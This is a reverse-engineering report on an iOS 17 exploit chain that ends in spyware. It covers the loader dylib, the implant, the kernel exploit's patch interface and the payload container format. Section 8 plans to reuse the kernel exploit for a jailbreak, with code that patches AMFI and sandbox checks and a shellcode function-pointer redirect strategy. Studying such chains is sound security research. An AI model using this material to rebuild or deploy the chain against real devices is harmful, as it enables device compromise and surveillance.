# Coruna bootstrap.dylib — Complete Reverse Engineering

**Date**: 2026-03-28  
**Binary**: `payloads/bootstrap.dylib` (89KB, arm64, MH_DYLIB)  
**Target**: iPhone14,3 (A15), iOS 17.0 (21A329)  
**Ghidra Project**: `ios` (`/Users/dev/ios`)  
**Payload Hash**: `377bed7460f7538f96bbad7bdc2b8294bdc54599` (iOS 17.0–17.2, A12+)

---

## 1. Exploit Chain — Full Dispatch Sequence

```
Safari
  → WebKit exploit (Stage1/Stage2 JS)
  → PAC bypass (arm64e)
  → Sandbox escape (Stage3 JS)
  → bootstrap.dylib loaded into WebContent process
  → Stage3 JS calls _process(context_struct)
  → bootstrap.dylib validates platform
  → Spawns worker thread
  → Worker communicates with JS via shared WASM buffer (D[0] state machine)
  → JS builds F00DBEEF container from manifest.json → feeds via shared buffer
  → bootstrap.dylib decrypts (ChaCha20) → decompresses (LZMA) → parses F00DBEEF
  → Populates entry table at context+0x140
  → Loads type 0x08 Mach-O (entry0_type0x08.dylib)
  → Resolves _start symbol → calls _start(context)

Type 0x08 _start(context):
  → Saves + replaces context function pointers (+0x28, +0x30, +0x38, +0x120–0x130)
  → Requests type 0x09 data via context->get_entry_raw(ctx, 0x90000, &data, &size)
  → Loads via context->entry_loader(ctx, data, size, &module)
  → Flushes caches: context->dcache_flush(ctx, module->text, module->text_size)
  → Resolves symbol: context->symbol_resolver(ctx, module, "_driver", &func_ptr)
  → Calls _driver(&result_ptr) in type 0x09
  → Validates: result->version == 2, result->sub_version >= 2
  → Calls _startl(context, driver_interface) to run the implant

Type 0x09 _driver(output_ptr):
  → Allocates 80-byte driver_interface_t via calloc(1, 0x50)
  → Writes version 0x00020002
  → Fills 8 PAC-signed function pointers (paciza)
  → Stores pointer at *output_ptr
  → Returns 0 on success
```

---

## 2. bootstrap.dylib Internals

### 2.1 Entry Point

Single export: `_process` at **0x68d8**.

```
nm -gU bootstrap.dylib
→ 000068d8 T _process
```

### 2.2 Key Imports

| Import | Purpose |
|--------|---------|
| `dlopen`, `dlsym`, `dlclose` | Dynamic Mach-O loading |
| `compression_decode_buffer` | LZMA decompression (algorithm 0x306) |
| `sys_dcache_flush`, `sys_icache_invalidate` | Cache coherency for loaded code |
| `mmap`, `vm_allocate`, `vm_protect` | Executable memory mapping |
| `semaphore_create/signal/wait` | Synchronization |
| `pthread_create` | Worker thread spawning |
| `CF*` (CoreFoundation HTTP) | C2 communication |
| `sandbox_check` | Sandbox state detection |
| `sysctl`, `sysctlbyname`, `uname` | Platform detection |

### 2.3 Encryption Pipeline

Outermost to innermost:

```
Server blob
  → ChaCha20 decryption (FUN_0000ad8c)
      Key: 8 × uint32 from context+0x98
      Sigma: "expand 32-byte k" at 0xbb60 (DJB variant, 64-bit counter, nonce=0)
  → LZMA decompression (FUN_00008430)
      Header: 0x0BEDF00D magic (4 bytes) + decompressed_size (4 bytes) + data
      Algorithm: 0x306 = COMPRESSION_LZMA
  → F00DBEEF container (raw entry data)
```

### 2.4 Function Map

| Address | Name | Description |
|---------|------|-------------|
| 0x68d8 | `_process` | Main entry. Validates, inits, spawns thread |
| 0x6c44 | thread_main | UIApplication background task + calls FUN_00005fec |
| 0x5fec | dispatch_main | Calls context+0x40 (main processor) via PAC trampoline |
| 0x8210 | init_entry_table | Clears entry table, sets function pointers +0xe8–0x110 |
| 0x7720 | platform_detect | Gets iOS/XNU version, CPU caps, WebContent check |
| 0x7090 | get_ios_version | Reads SystemVersion.plist → encodes as major<<16\|minor<<8\|patch |
| 0x8298 | init_memory | Sets up shared buffer, atomic allocator, dcache flush |
| 0x8430 | lzma_decompress | Checks 0x0BEDF00D magic, calls compression_decode_buffer |
| 0xad8c | chacha20 | ChaCha20 stream cipher (10 double-rounds) |
| 0x8080 | find_entry_by_type | Looks up entry in table by type code, lazy-loads if needed |
| 0x812c | get_entry_raw | Returns raw data pointer + size for entry type |
| 0x7ed4 | load_entry | Loads entry via context+0x30 callback if not yet loaded |
| 0x7e10 | load_next_unloaded | Finds first unloaded entry, triggers loading |
| 0x7fc8 | unload_entry | Frees/unloads entry by type |
| 0x8b5c | http_client | CFHTTPMessage-based HTTP GET/POST with retry |
| 0x9f18 | build_c2_url | Iterates command table (magic 0x12345678), builds URLs |
| 0x5dc8 | dcache_flush | Flushes dcache + invalidates icache (0x50000-byte chunks) |
| 0x5e78 | atomic_alloc | Lock-free allocator using LDXR/STXR exclusive monitor |
| 0xb0fc | pac_trampoline | PAC-authenticated indirect call (target in x10) |
| 0xb15c | pac_sign | PAC pointer signing helper |
| 0xb260 | pac_auth_call | PAC-authenticated tail call (braa x13, x8) |

### 2.5 PAC Trampoline (0xb0fc) — How Indirect Calls Work

The `__x` segment (0xb0a8–0xb27f) contains PAC trampolines. All indirect calls in bootstrap.dylib go through `FUN_0000b0fc`:

```asm
; Target function address in x10, args in x0–x3/x8–x9
0xb0fc: ldr  x13, 0xb0d8       ; load PAC key
0xb100: cbz  x13, 0xb144       ; if no key → simple path
0xb114: xpaci x10              ; strip PAC from target
0xb120: bl   0xb15c            ; re-sign pointer
0xb124: mov  x10, x0           ; signed target
        ; restore args from stack
0xb140: b    0xb260            ; tail call via braa x13, x8

; Simple path (no PAC):
0xb144: mov  x11, x30          ; save LR
0xb14c: xpaclri               ; strip PAC from LR
0xb158: br   x10               ; direct jump
```

The decompiler cannot follow these indirect calls, which is why most function call targets appear as `FUN_0000b0fc(...)` in the decompiled output. The actual target is set in **x10** before the `bl 0xb0fc` instruction.

---

## 3. Context Struct (0x648 bytes)

Passed to `_process()` by Stage3 JS. Copied with `malloc(0x648) + memcpy`.

### 3.1 Caller-Set Fields (by Stage3 JavaScript)

| Offset | Size | Type | Field |
|--------|------|------|-------|
| +0x28 | 8 | code* | func_28 (saved/replaced by type 0x08) |
| +0x30 | 8 | code* | **entry_loader** — decrypts + decompresses + maps entry data |
| +0x38 | 8 | code* | **symbol_resolver** — finds symbol in loaded Mach-O |
| +0x40 | 8 | code* | **main_processor** — main loop, comms with JS via shared buffer |
| +0x48 | 8 | void* | shared buffer address (WASM memory) |
| +0x50 | 4 | uint32 | buffer status word |
| +0x78 | 8 | char* | C2 URL path 1 (strdup'd by bootstrap) |
| +0x80 | 8 | char* | C2 base URL (strdup'd) |
| +0x88 | 8 | void* | midpoint of allocated memory region |
| +0x90 | 4 | uint32 | usable buffer size |
| +0x98 | 8 | void* | 32-byte ChaCha20 key struct (4 × uint64) |
| +0xA0 | 8 | char* | C2 URL path 2 (strdup'd) |
| +0xA8 | 8 | char* | C2 URL path 3 (strdup'd) |

### 3.2 Platform Fields (set by FUN_00007720)

| Offset | Size | Type | Field |
|--------|------|------|-------|
| +0xC0 | 4 | uint32 | **iOS version** — encoded as `major<<16 \| minor<<8 \| patch` |
| +0xC8 | 4 | uint32 | XNU version (encoded) |
| +0xD0 | 8 | uint64 | XNU build timestamp |
| +0xD8 | 4 | uint32 | CPU family ID (from `_get_cpu_capabilities`) |
| +0xDC | 4 | uint32 | CPU subtype/version |
| +0xE0 | 4 | uint32 | Hardware identifier hash |

iOS version encoding examples:

| iOS Version | Encoded Value |
|------------|---------------|
| 15.0 | 0x0F0000 |
| 16.0 | 0x100000 |
| 16.4 | 0x100400 |
| 17.0 | 0x110000 |
| 17.2 | 0x110200 |

### 3.3 Function Pointers (set by FUN_00008210 + FUN_00008298)

| Offset | Size | Type | Function | Description |
|--------|------|------|----------|-------------|
| +0xE8 | 8 | code* | FUN_00007c9c | Entry operations helper |
| +0xF0 | 8 | code* | FUN_00007e10 | load_next_unloaded — load first pending entry |
| +0xF8 | 8 | code* | FUN_00007ed4 | load_by_type — load specific entry type |
| +0x100 | 8 | code* | FUN_00007fc8 | unload_entry — free entry by type |
| +0x108 | 8 | code* | FUN_00008080 | find_entry — lookup entry by type, lazy-load |
| +0x110 | 8 | code* | FUN_0000812c | get_entry_raw — return raw data + size |
| +0x120 | 8 | code* | FUN_00005dc8 | dcache_flush — flush dcache + invalidate icache |
| +0x128 | 8 | code* | FUN_00005e78 | atomic_alloc — lock-free memory allocator |
| +0x130 | 8 | code* | — | module_unload — unloads Mach-O module |
| +0x138 | 8 | void* | — | atomic allocation counter pointer |

### 3.4 Entry Table (+0x140, 24 entries × 0x30 bytes)

```c
// Spans +0x140 through +0x5BF (0x480 bytes total)
// Max entries: 0x480 / 0x30 = 24

struct entry_slot {
    int32_t  type;       // +0x00: entry type (0x05/0x07/0x08/0x09/0x0a/0x0f)
    int32_t  flags;      // +0x04: entry flags/subtype
    void*    raw_data;   // +0x08: raw (encrypted+compressed) data pointer
    int32_t  raw_size;   // +0x10: raw data size in bytes
    void*    extra;      // +0x18: extra data pointer
    int32_t  extra_size; // +0x20: extra data size
    void*    loaded;     // +0x28: loaded module handle (NULL if not loaded)
};
```

Lookup: `find_entry(ctx, type_code)` iterates table, returns `loaded` pointer. If `loaded == NULL`, calls `entry_loader(ctx, raw_data, raw_size, &output)` to load on demand.

### 3.5 Flags

| Offset | Size | Field |
|--------|------|-------|
| +0x5C0 | 1 | Corellium detection flag |
| +0x5C1 | 1 | Platform capability flag |
| +0x5C2 | 1 | Sandboxed mode (affects _start behavior) |
| +0x5C3 | 1 | A12+ / arm64e flag |
| +0x5C4 | 1 | Restricted mode |
| +0x5C6 | 1 | Synchronous execution mode |
| +0x5E8 | 1 | Version-gated feature flag |
| +0x5E9 | 1 | Hardware-specific flag |
| +0x5EB | 1 | **Logging enabled** (gates all log_callback calls) |
| +0x5EC | 1 | Exit process after completion |
| +0x5F0 | 8 | **log_callback** function pointer: `(ctx, code, 0, tag)` |
| +0x5FC | 1 | Running in WebContent process |
| +0x640 | 8 | CPU capabilities value |

---

## 4. entry0_type0x08.dylib (The Implant / Orchestrator)

**Binary**: 228KB, arm64e, MH_DYLIB, 751 functions

### 4.1 Exports

```
nm -gU entry0_type0x08.dylib
0000000000008754 T _start       ← Main entry, called by bootstrap.dylib
0000000000008228 T _startl      ← Worker entry, called by _start with driver interface
0000000000008d90 T _startr      ← Recovery/restart entry
00000000000094dc T _startm      ← Monitoring entry
```

### 4.2 _start(context) — Main Entry Point

Receives the **same 0x648-byte context struct** from bootstrap.dylib. Verified by:
- `memcpy(global_ctx, param_1, 0x648)` at global `DAT_0002c138`
- Same flag offsets: +0x5eb (logging), +0x5f0 (callback), +0x5c2 (sandboxed), etc.

**Behavior:**

1. **Hooks the context function table** — saves originals, replaces with its own:

| Offset | Original (bootstrap) | Replaced With |
|--------|---------------------|---------------|
| +0x28 | func_28 | FUN_00010218 |
| +0x30 | entry_loader | FUN_0000a38c |
| +0x38 | symbol_resolver | FUN_0000c6f0 |
| +0xB0 | func_b0 | FUN_00010248 |
| +0x120 | dcache_flush | FUN_000100e8 |
| +0x128 | atomic_alloc | FUN_00010178 |
| +0x130 | module_unload | FUN_0000c8b0 |

2. **Loads type 0x09 kernel exploit** via `FUN_000107ec()`:
   - Requests entry data: `get_entry_raw(ctx, 0x90000, &data, &size)`
   - Loads: `entry_loader(ctx, data, size, &module)`
   - Flush caches: `dcache_flush(ctx, module->text, module->text_size)`
   - **Resolves `_driver`**: `symbol_resolver(ctx, module, "_driver", &func_ptr)`
   - **Calls `_driver(&result)`** — runs the kernel exploit
   - Validates result: `version == 2 && sub_version >= 2`

3. **Dispatches to `_startl`**:
   - Resolves `_startl` in itself (or in a loaded module)
   - Calls `_startl(context, driver_interface)`

4. **Restores original function pointers** on exit.

### 4.3 _startl(context, driver_interface) — Worker Entry

```c
undefined8 _startl(void *context, short *driver_interface);
```

- `context` — the 0x648-byte bootstrap context struct
- `driver_interface` — the 80-byte struct returned by type 0x09's `_driver()`
- Validates: `*driver_interface == 2` (version), `driver_interface[1] >= 2` (sub_version)
- Initializes module state via `FUN_00025020`
- Calls `FUN_0000863c` three times with IDs `0x70003`, `0x70004`, `0x70006` (resource loading)
- Spawns worker thread running `FUN_000094e8` with a 0x38-byte task struct

### 4.4 _startr(param) — Recovery Entry

- Takes a struct where `*param == 1` (interface version 1)
- Accesses sub-struct at byte offset +0x38
- Checks for magic `0xDEADD00F` (verified: `-0x21522ff1` = `0xDEADD00F`)
- Calls `FUN_00008e84(param, has_data, 1)` — recovery mode

### 4.5 _startm(param) — Monitor Entry

- Simple wrapper: calls `FUN_00008e84(param, 0, 0)` — monitoring mode

---

## 5. entry1_type0x09.dylib (The Kernel Exploit)

**Binary**: 333KB, arm64e, MH_DYLIB  
**Single export**: `_driver` at **0x5ec4**

### 5.1 _driver(output_ptr) — Entry Point

```c
int _driver(void **output_ptr);
// Returns: 0 on success, 0xad001 on NULL input, 0xad009 on alloc failure
```

Disassembly of `_driver` (verified from otool):

```asm
_driver:
  pacibsp
  ; ... prologue ...
  cbz  x0, error              ; NULL check on output_ptr
  mov  x20, x0                ; save output_ptr
  mov  w0, #1
  mov  w1, #0x50              ; size = 80 bytes
  bl   _calloc                ; allocate driver_interface_t
  cbz  x0, alloc_fail
  
  mov  w8, #0x20002            ; version=2, sub_version=2
  str  w8, [x0]               ; +0x00: version header
  
  adr  x16, cleanup_func      ; func at _driver+0xd8 (0x5f9c)
  paciza x16                   ; PAC-sign with zero context
  str  x16, [x0, #0x10]       ; +0x10: cleanup
  
  adr  x16, init_state_func   ; func at 0x5fdc
  paciza x16
  str  x16, [x0, #0x18]       ; +0x18: init_state
  
  adr  x16, kpatch_func       ; func at 0x6030
  paciza x16
  str  x16, [x0, #0x28]       ; +0x28: kpatch
  
  adr  x16, commit_func       ; func at 0x6070
  paciza x16
  str  x16, [x0, #0x30]       ; +0x30: commit_state
  
  adr  x16, release_func      ; func at 0x608c
  paciza x16
  str  x16, [x0, #0x20]       ; +0x20: release_state
  
  adr  x16, get_info_func     ; func at 0x60a8
  paciza x16
  str  x16, [x0, #0x38]       ; +0x38: get_exploit_info
  
  adr  x16, batch_patch_func  ; func at 0x60ec
  paciza x16
  str  x16, [x0, #0x40]       ; +0x40: batch_patch
  
  adr  x16, get_kinfo_func    ; func at 0x6224
  paciza x16
  str  x16, [x0, #0x48]       ; +0x48: get_kernel_info
  
  str  x0, [x20]              ; *output_ptr = struct
  ; return 0
```

### 5.2 driver_interface_t — The Kernel R/W Handoff Struct

```c
// Allocated by _driver() via calloc(1, 0x50)
// Total size: 80 bytes (0x50)
// All function pointers are PAC-signed with paciza (zero-context)

typedef struct {
    int16_t  version;           // +0x00: always 2
    int16_t  sub_version;       // +0x02: always 2
    uint8_t  reserved[12];      // +0x04: zero (from calloc)

    code*    cleanup;           // +0x10: at 0x5f9c — zeros struct + free()
    code*    init_state;        // +0x18: at 0x5fdc — creates kernel operation state
    code*    release_state;     // +0x20: at 0x608c — frees kernel operation state
    code*    kpatch;            // +0x28: at 0x6030 — writes to kernel address
    code*    commit_state;      // +0x30: at 0x6070 — commits/flushes kernel writes
    code*    get_exploit_info;  // +0x38: at 0x60a8 — reads exploit internal state
    code*    batch_patch;       // +0x40: at 0x60ec — applies array of kernel patches
    code*    get_kernel_info;   // +0x48: at 0x6224 — returns XNU version info
} driver_interface_t;
```

### 5.3 Function Signatures (from disassembly)

#### cleanup (+0x10, at 0x5f9c)

```c
int cleanup(driver_interface_t *self);
// If self == NULL: returns 0xad001
// Otherwise: zeros the struct (stp q0 × 3), calls free(self), returns 0
```

#### init_state (+0x18, at 0x5fdc)

```c
int init_state(driver_interface_t *self, int mode, void **state_out);
// Creates an internal kernel operation context
// self: driver struct pointer
// mode: 0 = normal init
// state_out: receives opaque state handle
// Calls internal function at 0x3e42c
// Returns: 0 on success, stores state at *state_out
```

#### release_state (+0x20, at 0x608c)

```c
int release_state(driver_interface_t *self, void *state);
// Frees kernel operation state
// Tail-calls internal function at 0x3f4bc
// Returns: 0 on success, 0xad001 if self/state is NULL
```

#### kpatch (+0x28, at 0x6030)

```c
int kpatch(driver_interface_t *self, void *state, uint32_t kaddr, void *data);
// Writes data to kernel memory address
// self: driver struct
// state: from init_state()
// kaddr: target kernel address (uint32_t — relative to base?)
// data: data to write
// Calls internal function at 0x3e550 with (kaddr, data)
// Returns: 0 on success
```

#### commit_state (+0x30, at 0x6070)

```c
int commit_state(driver_interface_t *self, void *state);
// Commits/flushes pending kernel writes
// Tail-calls internal function at 0x3f2e0
// Returns: 0 on success, 0xad001 if self/state is NULL
```

#### get_exploit_info (+0x38, at 0x60a8)

```c
int get_exploit_info(driver_interface_t *self, void *info_struct, uint32_t *count_out);
// Reads internal exploit state
// Accesses info_struct+0x1918 (internal counter)
// Checks counter+1 >= 2
// Returns: 0 on success, stores count at *count_out
// Error: 0xad001 (NULL args), 0xad00a (invalid state)
```

#### batch_patch (+0x40, at 0x60ec)

```c
int batch_patch(driver_interface_t *self, void **state_ptr, 
                void *patches, uint32_t count, int continue_on_error);
// Applies an array of kernel patches atomically
// 
// self: driver struct (also used to call sub-functions via offsets)
// state_ptr: pointer to state handle (may be initialized by this function)
// patches: array of {uint32_t kaddr, uint64_t data} pairs (stride 0x10)
// count: number of patches
// continue_on_error: if set, continues after individual patch failures
//
// Algorithm:
//   if *state_ptr == NULL:
//     self->init_state(self, 0, state_ptr)    // via +0x18
//   for each patch:
//     self->kpatch(self, *state_ptr, patch.kaddr, patch.data)  // via +0x28
//   if all succeed:
//     store state at *state_ptr
//   on failure:
//     self->commit_state(self, *state_ptr)    // via +0x30 (rollback?)
//     self->release_state(self, *state_ptr)   // via +0x20
//
// Uses blraaz for PAC-authenticated calls to sub-functions
```

Patch array element layout:

```c
struct kernel_patch {
    uint32_t kaddr;     // +0x00: kernel address to patch
    uint32_t padding;   // +0x04: (alignment)
    void*    data;      // +0x08: pointer to patch data
};  // stride: 0x10 = 16 bytes
```

#### get_kernel_info (+0x48, at 0x6224)

```c
int get_kernel_info(driver_interface_t *self, void *output_buf);
// Returns kernel version information
// Calls mach_host_self() → host_kernel_version()
// Falls back to sysctl({CTL_KERN, KERN_VERSION}) on error 0x35
// Searches for "RELEASE" and "xnu-" in version string
// Parses: "xnu-%d.%d.%d.%d.%d"
// Returns: 0 on success, error codes with 0x80000000 flag on sysctl failure
```

### 5.4 Type 0x09 Import Profile

Confirms full kernel exploit capabilities:

**IOKit (exploit vector)**:
`IOServiceOpen`, `IOServiceClose`, `IOServiceMatching`, `IOServiceGetMatchingService`,
`IOConnectCallMethod`, `IOConnectCallScalarMethod`, `IOConnectCallStructMethod`,
`IOConnectTrap4`, `IOConnectTrap6`, `IORegistryEntryCreateCFProperty`,
`IOServiceWaitQuiet`, `_IOServiceSetAuthorizationID`

**Kernel memory**:
`mach_vm_allocate`, `mach_vm_write`, `mach_vm_read_overwrite`, `mach_vm_deallocate`,
`mach_vm_protect`, `mach_vm_wire`, `mach_vm_machine_attribute`, `mach_vm_page_info`,
`mach_make_memory_entry`, `mach_make_memory_entry_64`,
`vm_remap`, `vm_map`, `vm_copy`, `vm_read_overwrite`, `vm_write`, `vm_protect`

**Mach ports**:
`mach_port_allocate`, `mach_port_insert_right`, `mach_port_space_info`,
`mach_port_get_attributes`, `mach_port_set_attributes`, `mach_port_mod_refs`,
`mach_port_request_notification`, `mach_ports_register`,
`host_get_special_port`, `task_get_special_port`, `task_set_special_port`

**Process injection**:
`task_threads`, `thread_create`, `thread_get_state`, `thread_set_state`,
`thread_resume`, `thread_suspend`, `thread_terminate`, `thread_set_exception_ports`,
`pthread_create_suspended_np`, `pthread_from_mach_thread_np`

**Filesystem**:
`mount`, `unmount`, `ffsctl`, `open_dprotected_np`, `getmntinfo`,
`posix_spawn`, `posix_spawnattr_*`, `posix_spawn_file_actions_*`

**Crypto**:
`CC_SHA1_Init/Update/Final`, `CC_SHA256_Init/Update/Final`, `CC_SHA384_Init/Update/Final`

**Mach vouchers (exploit primitive)**:
`host_create_mach_voucher`

**Miscellaneous exploit utilities**:
`task_map_corpse_info_64`, `host_processors`, `processor_set_default/info`,
`necp_open`, `necp_client_action`, `fileport_makefd`, `fileport_makeport`,
`host_security_set_task_token`

---

## 6. F00DBEEF Container Format

### 6.1 Header

```c
typedef struct {
    uint32_t magic;         // 0xF00DBEEF (little-endian: EF BE 0D F0)
    uint32_t entry_count;   // Number of entries
} __attribute__((packed)) f00dbeef_header_t;  // 8 bytes
```

### 6.2 Entry Table

```c
// Immediately follows header, entry_count × 16 bytes
typedef struct {
    uint32_t field1;        // Upper 16 bits = entry type: (field1 >> 16) & 0xFF
    uint32_t field2;        // Flags (typically 0x00000003)
    uint32_t data_offset;   // Byte offset from container start to payload data
    uint32_t data_size;     // Payload size in bytes
} __attribute__((packed)) f00dbeef_entry_t;  // 16 bytes
```

### 6.3 Entry Types

| Type | Name | Size (iOS 17.0) | Content |
|------|------|----------------|---------|
| 0x05 | Kernel offsets | 24 KB | Kernel gadget addresses/offset table |
| 0x07 | Config | 49–468 bytes | Metadata/configuration blobs |
| 0x08 | **Implant** | 228 KB | Spyware orchestrator — **WE REPLACE THIS** |
| 0x09 | **Kernel exploit** | 330–333 KB | Kernel R/W + PAC bypass + security patches |
| 0x0a | Extra module | — | Additional exploit module (newer iOS only) |
| 0x0f | Persistence | 191 KB | Daemon hooks (launchd/powerd) |

### 6.4 iOS 17.0 Payload Set (377bed74...)

```
entry0_type0x08.dylib    228 KB  arm64e  Spyware implant (our replacement target)
entry1_type0x09.dylib    333 KB  arm64e  Kernel exploit (THE GOLD — untouched)
entry2_type0x0f.dylib    191 KB  arm64e  Persistence (hooks launchd)
entry3_type0x07.bin       49 B          Config blob
entry4_type0x05.bin       24 KB         Kernel offsets/gadgets
entry5_type0x09.dylib    330 KB  arm64e  Alt kernel exploit
entry6_type0x07.bin      468 B          Config blob
```

---

## 7. Shared Buffer Protocol (D[0] State Machine)

Communication between bootstrap.dylib and Stage3 JavaScript via WASM shared memory:

| D[0] Value | Meaning | Direction |
|-----------|---------|-----------|
| 0 | Idle | — |
| 1 | Download request (URL at buffer+8) | bootstrap → JS |
| 2 | Busy / processing | JS → bootstrap |
| 3 | Data ready (container in buffer) | JS → bootstrap |
| 4 | Error | Either |
| 5 | Done / complete | bootstrap → JS |
| 6 | URL request | bootstrap → JS |
| 7 | HTTP POST data | bootstrap → JS |

JS `buildContainer(hashName)` assembles F00DBEEF from `manifest.json` entries when D[0]=1.

---

## 8. Implications for Jailbreak Bootstrap

### 8.1 Required Exports

Our replacement type 0x08 must export:

```c
int _start(void *context);                          // Main entry
int _startl(void *context, void *driver_interface); // Worker with kernel primitives
int _startr(void *param);                           // Recovery mode
void _startm(void *param);                          // Monitor mode
```

### 8.2 The kernel_primitives_t Struct is WRONG

The stub in `jailbreak_bootstrap.c` assumed raw `kread_fn`/`kwrite_fn` function pointers. The actual interface from type 0x09 is **patch-based**:

```c
// WRONG (current stub):
typedef struct {
    mach_port_t kernel_task_port;
    uint64_t    kslide;
    uint64_t    kbase;
    void       *kread_fn;
    void       *kwrite_fn;
    int         exploit_success;
} kernel_primitives_t;

// CORRECT (from RE):
typedef struct {
    int16_t  version;            // +0x00: 2
    int16_t  sub_version;        // +0x02: 2
    uint8_t  reserved[12];       // +0x04: zero
    void*    cleanup;            // +0x10
    void*    init_state;         // +0x18
    void*    release_state;      // +0x20
    void*    kpatch;             // +0x28
    void*    commit_state;       // +0x30
    void*    get_exploit_info;   // +0x38
    void*    batch_patch;        // +0x40
    void*    get_kernel_info;    // +0x48
} driver_interface_t;            // 0x50 = 80 bytes
```

### 8.3 Usage Pattern for Kernel Patching

```c
// To patch AMFI or sandbox:
driver_interface_t *drv = /* received from _startl param_2 */;

// Method 1: Individual patches
void *state = NULL;
drv->init_state(drv, 0, &state);
drv->kpatch(drv, state, amfi_addr, patch_data);
drv->commit_state(drv, state);
drv->release_state(drv, state);

// Method 2: Batch patches
struct kernel_patch patches[] = {
    { amfi_check_addr,  0, &nop_ret_data },
    { sandbox_addr,     0, &nop_ret_data },
};
void *state = NULL;
drv->batch_patch(drv, &state, patches, 2, 0);
drv->release_state(drv, state);
```

### 8.4 Integration Point for CVE-2024-27840

#### 8.4.1 What the CVE Is

CVE-2024-27840 is a two-stage kernel memory protection bypass (patched iOS 17.5):

- **Stage 1**: `vm_map_enter_mem_object_helper()` accepts `cur_protection=RW, max_protection=R` without validating `cur ≤ max`. Proven on-device (iPhone 13 Pro Max, A15, iOS 17.0).
- **Stage 2**: `pmap_has_prot_policy()` enforcement in `vm_fault_enter_prepare()` uses `assert()` which compiles to `((void)0)` in RELEASE kernels. Verified in Ghidra: zero panic strings for this in 17.0 kernelcache, four new ones in 17.5.1.
- **Result**: Create writable mappings to kernel read-only pages (XNU_DEFAULT typed pages on SPTM).
- **Precondition**: Kernel code execution.

#### 8.4.2 Where It Plugs Into the Chain

```
Coruna chain provides kernel code execution via type 0x09
  │
  ├─ Type 0x09 _driver() returns driver_interface_t
  │   └─ Patch-based: kpatch(self, state, addr, data)
  │
  ├─ Type 0x08 _startl(context, driver_interface) receives primitives
  │   └─ THIS IS THE INSERTION POINT
  │
  └─ CVE-2024-27840 test runs HERE, inside _startl()
      before any AMFI/sandbox patching
```

The test executes inside `_startl()` immediately after validating the driver interface (version=2, sub_version≥2) and before any jailbreak-specific patching. This ensures the kernel exploit has completed and primitives are live.

#### 8.4.3 The Problem: Patch Interface vs. Syscall

CVE-2024-27840 requires **calling kernel functions** (`vm_map_enter_mem_object()` with `cur=RW, max=R`), not patching memory locations. The driver_interface_t from type 0x09 provides:

| Function | What It Does | Useful for CVE test? |
|----------|-------------|---------------------|
| `kpatch` (+0x28) | Write data to kernel address | Indirect only |
| `batch_patch` (+0x40) | Atomic multi-write | Indirect only |
| `init_state` (+0x18) | Create kernel op state | Prerequisite |
| `get_kernel_info` (+0x48) | Read XNU version | Yes — version check |
| `get_exploit_info` (+0x38) | Read exploit state | Possibly — read primitive? |

**Direct approach won't work**: We cannot call `vm_map_enter_mem_object()` through `kpatch` because `kpatch` writes bytes to addresses — it doesn't invoke kernel functions.

#### 8.4.4 Three Viable Integration Strategies

**Strategy A — Userspace Probe (no kernel context needed)**

The Stage 1 validation bug is testable from userspace via `mach_vm_map()`:

```c
// Runs inside _startl() but uses USERSPACE Mach trap, not kernel internals
static int cve_2024_27840_test_stage1(void) {
    mach_vm_address_t addr = 0;
    mach_port_t self_task = mach_task_self();

    // Allocate a page with max=R
    kern_return_t kr = mach_vm_allocate(self_task, &addr, 0x4000, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) return -1;

    kr = mach_vm_protect(self_task, addr, 0x4000, /*set_max=*/1, VM_PROT_READ);
    if (kr != KERN_SUCCESS) return -1;

    // THE BUG: set cur=RW despite max=R
    kr = mach_vm_protect(self_task, addr, 0x4000, /*set_max=*/0, VM_PROT_READ | VM_PROT_WRITE);

    // On iOS ≤17.4: kr == KERN_SUCCESS (vulnerable)
    // On iOS ≥17.5: kr == KERN_PROTECTION_FAILURE (patched)

    int vulnerable = (kr == KERN_SUCCESS);
    mach_vm_deallocate(self_task, addr, 0x4000);
    return vulnerable;
}
```

**Advantage**: No kernel primitives required. Runs in any context after sandbox escape.
**Location**: Can run in `_start()` before even loading type 0x09. Or in `_startl()` for logging through the driver.
**Limitation**: Only tests Stage 1. Does not prove kernel-context exploitation.

**Strategy B — Kernel Function Pointer Redirect via kpatch**

Use the patch interface to redirect a kernel function pointer to shellcode that calls `vm_map_enter_mem_object()`:

```c
static int cve_2024_27840_test_kernel(driver_interface_t *drv, void *context) {
    void *state = NULL;

    // 1. Use get_kernel_info to confirm iOS ≤17.4
    // 2. Use get_exploit_info to read kernel state (kslide, base)
    // 3. Allocate RWX memory in kernel (type 0x09 already did this for its own code)
    // 4. Write shellcode via kpatch:
    //      - Calls vm_map_enter_mem_object(kernel_map, &new_addr, size,
    //                                      0, VM_FLAGS_ANYWHERE, mem_entry,
    //                                      0, FALSE, VM_PROT_READ|VM_PROT_WRITE,
    //                                      VM_PROT_READ, VM_INHERIT_NONE)
    //      - Stores result at known address
    //      - Returns to original caller
    // 5. Patch a suitable kernel function pointer to point to shellcode
    // 6. Trigger the patched function
    // 7. Read result via get_exploit_info or kpatch-based read gadget
    // 8. Restore original function pointer

    drv->init_state(drv, 0, &state);
    // ... patch sequence ...
    drv->commit_state(drv, state);
    drv->release_state(drv, state);
    return 0;
}
```

**Advantage**: Full kernel-context test of both Stage 1 and Stage 2.
**Limitation**: Requires knowing shellcode target address and kernel_map location. Requires the exploit's internal memory allocation. High complexity.
**Risk**: Function pointer corruption can panic if not restored atomically.

**Strategy C — Leverage Type 0x09's Internal Primitives**

Type 0x09 imports `mach_vm_allocate`, `mach_vm_write`, `mach_vm_protect`, `vm_map`, `vm_remap`, and `vm_protect`. Its internal functions (at 0x3e42c, 0x3e550, 0x3f2e0, 0x3f4bc) likely use these to implement the patch interface. If `init_state` (0x5fdc → 0x3e42c) returns a **state object that exposes raw kernel memory operations**, we could call `vm_map_enter_mem_object()` through the state.

```
Requires further RE of type 0x09 internals:
  0x3e42c — init_state implementation (may expose vm_map_t or task port)
  0x3e550 — kpatch implementation (how it writes to kernel memory)
  0x3f2e0 — commit_state implementation
  0x3f4bc — release_state implementation
```

**Advantage**: Uses the exploit's own proven kernel access path.
**Limitation**: Requires importing entry1_type0x09.dylib into Ghidra (currently blocked by DB lock).

#### 8.4.5 Recommended Integration Plan

| Phase | Action | Risk | Depends On |
|-------|--------|------|------------|
| **Phase 1** | Userspace Stage 1 probe in `_start()` before loading type 0x09 | Zero — pure Mach trap | Sandbox escape only |
| **Phase 2** | XNU version check via `drv->get_kernel_info()` in `_startl()` to confirm ≤17.4 | Zero — read-only | driver_interface_t |
| **Phase 3** | RE type 0x09 internals (0x3e42c–0x3f4bc) to find raw kread/kwrite under the patch API | None (analysis) | Ghidra import of type 0x09 |
| **Phase 4** | Full kernel-context test via Strategy B or C | Medium — kernel writes | Phase 3 results |

